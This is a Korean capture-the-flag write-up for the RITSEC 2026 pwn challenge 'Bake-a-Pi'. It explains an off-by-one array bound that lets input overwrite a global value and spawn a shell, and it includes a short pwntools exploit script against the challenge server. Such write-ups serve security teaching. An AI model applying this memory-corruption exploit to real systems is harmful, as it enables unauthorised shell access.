---
ctf_name: "RITSEC-CTF-2026"
challenge_name: "Bake-a-Pi"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "easy"      # easy / medium / hard / insane
author: "topjs1"
date: "2026-04-05"
points: 400
tags: [OOB, off-by-one]
---

# 문제명
Bake-a-Pi
## 문제 설명

Are you good at baking? I'm trying to create the perfect pi recipe, but can't quite get it right. Can you help me?

- nc bake-a-pi.ctf.ritsec.club 1555


## 풀이


### 분석

1. checksec 결과 :
Stack:      No canary found
Stripped:   No

ida를 통해 코드를 확인해보았다.

'''
if ( *(double *)&pi == 3.141592653589793 )
        {
          puts("Yummy! This is the perfect pi!");
          execl("/bin/bash", "/bin/bash", 0LL);
        }
'''
pi 값이 일치하면 /bin/bash 가 실행됨을 알 수 있다.

입력을 받는 부분의 함수를 체크하였다. 이 과정에서 배열의 크기를 의도한 것보다 크게 허용하는 부분을 확인하였다.
'''
if ( v5 <= 8 )
      {
        printf("Enter ingredient: ");
        fgets(&ingredients[32 * v5], 32, stdin);
        v3 = v5;
        ingredients[32 * v3 - 1 + strlen(&ingredients[32 * v5])] = 0;
      }
'''


![screenshot](images/2.png)
ingredients[0] -> 0x404080
ingredients[1] -> 0x4040a0
...
pi 의 주소가 0x404180 이므로, ingredients[0]와의 차이는 0x100, 이다. 각 배열의 크기는 0x20 이므로 index 8 위치에 pi 가 존재한다.
![screenshot](images/1.png)
![screenshot](images/3.png)

(T)aste test 분기에서 전역변수 pi를 읽어 .data의 0x402200의 값과 비교한다.

### 취약점

배열의 개수를 8개로 선언하고, index를 8 까지 허용하였다.
이는 배열 경계 검사 오류로 인해 pi를 덮을 수 있게 하였다.

### 익스플로잇



```python
from pwn import *
import struct

p = remote('bake-a-pi.ctf.ritsec.club', 1555)

payload = struct.pack('<d', 3.141592653589793)
p.sendline(b'C')
p.sendline(b'8')
p.send(payload + b'\n')
p.sendline(b'T')
p.interactive()
```

## 플래그
![screenshot](images/0.png)
```
RS{REDACTED}
```

## 배운 점
 
fgets 함수는 gets 에 비해 상대적으로 안전하지만 인덱스 검증과 주소계산을 잘못하게되면 메모리 corruption이 발생할 수 있다. 